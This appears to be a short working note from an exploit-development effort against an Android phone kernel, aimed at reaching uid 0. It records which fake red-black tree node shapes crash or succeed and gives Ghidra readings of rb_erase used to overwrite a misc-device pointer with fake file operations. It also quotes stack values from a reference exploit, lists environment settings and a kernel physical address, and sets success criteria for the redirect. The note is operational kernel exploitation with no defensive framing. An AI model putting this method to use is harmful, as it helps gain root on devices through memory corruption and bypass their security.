# Closest path to uid 0 — REF only-left (2026-08-09)

## Why not F/A/E2 again

| Path | RE outcome |
|------|------------|
| A classic only-right main | softboot at select |
| E2/F only-right inverted main + consumer | softboot when punch lands |
| B/C PI classic only-right | alive, **cfi22** (PI erase not committing) |
| Plateau inert | alive, cfi22 (no gadget) |

## Ghidra `rb_erase` (Image)

**only-right** (`left==0`, `right≠0`): `*right = parent_color`, then rewire parent.  
**only-left** (`right==0`, `left≠0`): rewire parent, then `*left = parent_color`.

So `*MISC = fake_fops` works with:

| Shape | parent | right | left |
|-------|--------|-------|------|
| only-right inverted (E2) | fake_fops | MISC | 0 |
| **only-left (ref default)** | fake_fops | **0** | **MISC** |
| classic only-right | MISC−8 | fake_fops | 0 |

## Reference ports (working elsewhere)

`oppo-ghostlock-ref` stack + heap default is **only-left**:

```c
// fops.c stack words
tree_pc = fake_fops; tree_right = 0; tree_left = MISC;
pi_parent = fake_fops; pi_right = 0; pi_left = MISC;
// util.c W0.pi same; main = 1,0,0
```

CPH never env-tested this dual only-left shape (we kept only-right digs).

## Env

```text
MODE4_ONLY=1 MODE4_REF_LEFT=1 KPHYS=0xa8000000 PSELECT_ROUTE_DELAY_USEC=150000
# softer: MODE4_REF_LEFT_PI=1  (PI only-left, main zero)
```

## USB recovery

After softboot ADB stale: `.\adb_usb_recover.ps1` (restart adb + cycle USB PnP).

## Success criteria

`cfi write ret≥0` or `errno≠22` with same `boot_id` → fops redirect; then full path (no MODE4_ONLY) toward uid 0.
